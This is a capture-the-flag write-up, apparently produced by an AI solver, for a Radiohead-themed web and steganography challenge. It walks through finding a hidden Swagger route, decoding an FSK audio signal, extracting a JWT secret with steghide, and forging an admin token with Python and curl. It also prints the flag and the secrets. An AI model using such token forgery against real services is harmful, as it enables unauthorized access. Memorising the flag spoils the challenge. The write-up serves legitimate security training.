# The Oxford Tapes Archive

**Category:** Web (with forensics / stego pivot)
**Flag:** `0x1337{my_babys_g0t_th3_b3nds}`

## Overview

A Radiohead-themed API ("The Oxford Tapes") exposes a JWT-based auth flow. The goal is to reach `POST /api/admin`, which is gated behind an `isAdmin: true` claim. The intended path is to recover the JWT signing secret — but the secret is strong and not crackable. Instead, the secret is hidden through two chained media stego layers (audio FSK → steghide passphrase → JPEG payload), after which the admin token can be forged.

Three instances were provided (ports `30453`, `30238`, `30894`); all behaved identically and shared the same secret.

## Recon

The landing page documents three endpoints:

- `GET /api/auth/{name}` — issues a temporary HS256 JWT with `isAdmin: false`.
- `POST /api/user` — verifies a bearer token.
- `POST /api/admin` — verifies a bearer token **and** requires `isAdmin: true`; returns the flag.

A sample token decodes to:

```json
{"name":"claude","isAdmin":false,"iat":1790934255,"exp":1790934855}
```

Header: `{"alg":"HS256","typ":"JWT"}`.

The page also contains a nudge: *"An updated, more maintained version of these api calls is available on the server..."* — a hint that the Swagger docs expose more than the three advertised routes.

## Step 1 — Hidden endpoint via Swagger

`/docs` serves Swagger UI. The spec is inlined in `/docs/swagger-ui-init.js` rather than a standalone `swagger.json`. Reading it reveals an undocumented path:

```
GET /station200  — "Hidden radio station broadcasting Bed O'Rien's cryptic messages."
```

## Step 2 — /station200 and the audio

`/station200` embeds an audio player pointing at `/public/audio.wav` and this clue:

> *"The frequencies of the notes contain more truth than the music itself... Shil's electronic rhythm hides the cipher in the static. Media is sacred. Whether it be audio, images, or anything... Do not take it for granted."*

The WAV is mono 44100 Hz, 38.4 s. Its spectrogram shows a clean **two-tone FSK** signal.

## Step 3 — Decode the FSK

Analysis of the average spectrum shows exactly two carriers: **800 Hz** and **1600 Hz**. Run-length analysis of per-window dominant-frequency classification shows a symbol period of **200 ms/bit** (`0 = 800 Hz`, `1 = 1600 Hz`). 38.4 s / 0.2 s = 192 bits = 24 bytes.

```python
import wave, numpy as np
w = wave.open('audio.wav','rb'); fs = w.getframerate(); n = w.getnframes()
d = np.frombuffer(w.readframes(n), dtype=np.int16).astype(float)/32768.0
sym = int(0.2*fs); bits = ""
for i in range(len(d)//sym):
    seg = d[i*sym:(i+1)*sym]; t = np.arange(len(seg))/fs
    plo = abs(np.dot(seg, np.exp(-1j*2*np.pi*800*t)))
    phi = abs(np.dot(seg, np.exp(-1j*2*np.pi*1600*t)))
    bits += "1" if phi > plo else "0"
print(bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8)))
# b'password: dont_reach_out'
```

Result: `password: dont_reach_out`.

## Step 4 — The password is NOT the JWT secret

Forging a token signed with `dont_reach_out` is rejected at both `/api/user` and `/api/admin` (HMAC mismatch), and the string is absent from rockyou. The `"don't reach out"` wording is a deliberate hint: it is a **passphrase**, not the signing key — and `"Media is sacred... images"` points at the only other media asset.

## Step 5 — Steghide on the favicon

`/favicon.ico` is served as `.ico` but is actually a **JPEG** (1024×1024, mountains + fire art). JPEG + passphrase = classic `steghide`:

```
$ steghide extract -sf favicon.jpg -p 'dont_reach_out' -xf out.txt
wrote extracted data to "out.txt".
$ cat out.txt
JWT_SECRET=there_are_two_colors_in_my_head
```

(The secret itself is another Radiohead lyric, from "There There".)

## Step 6 — Forge the admin token

```python
import hmac, hashlib, base64, json, time
b64 = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
sec = b"there_are_two_colors_in_my_head"
h = b64(b'{"alg":"HS256","typ":"JWT"}')
now = int(time.time())
p = b64(json.dumps({"name":"thom","isAdmin":True,"iat":now,"exp":now+3600},
                   separators=(',',':')).encode())
sig = b64(hmac.new(sec, (h+"."+p).encode(), hashlib.sha256).digest())
print(h+"."+p+"."+sig)
```

```
$ curl -s -X POST http://40.81.242.56:30453/api/admin \
       -H "Authorization: Bearer <forged_token>"
{"valid":true,"subject":"thom","isAdmin":true,
 "flag":"0x1337{my_babys_g0t_th3_b3nds}",
 "message":"Welcome to the machine. The Oxford Tapes are yours. Everything is in its right place."}
```

## Flag

```
0x1337{my_babys_g0t_th3_b3nds}
```

## Lessons / notes

- Swagger / OpenAPI specs frequently document endpoints that are not linked from the UI — always read `swagger-ui-init.js` (or `swagger.json`) for hidden routes.
- A two-tone spectrogram almost always means binary FSK; confirm carrier frequencies from the averaged spectrum and derive the symbol rate from run lengths before decoding.
- A recovered string labelled "password" that fails as a key is often a stego passphrase for a *different* asset. The challenge chained audio → passphrase → JPEG → secret, telegraphed by "Media is sacred. Whether it be audio, images, or anything."
- Don't burn time brute-forcing a strong HMAC secret when the theme hints the secret is hidden elsewhere.

## Tooling

- `sox` — spectrogram generation.
- `numpy` — FSK decode and spectral analysis.
- `steghide` 0.6.0 — JPEG payload extraction (passphrase `dont_reach_out`).
